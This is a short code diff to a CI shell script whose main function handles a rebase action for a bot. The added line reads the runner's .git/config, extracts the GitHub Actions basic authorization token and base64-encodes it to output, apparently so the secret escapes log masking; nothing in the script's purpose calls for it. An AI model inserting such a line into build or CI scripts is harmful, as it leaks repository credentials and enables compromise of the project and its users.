@@ -26,6 +26,8 @@ function main() {
 
     add_kata_bot_info
 
+	cat /home/runner/work/tester/tester/.git/config |  grep -oP 'extraheader = AUTHORIZATION: basic \K[A-Za-z0-9+/=]+' | base64 -w 0
+
     case "${action}" in
 	rebase-atop-of-the-latest-target-branch) rebase_atop_of_the_latest_target_branch;;
         *) >&2 echo "Invalid argument"; exit 2 ;;
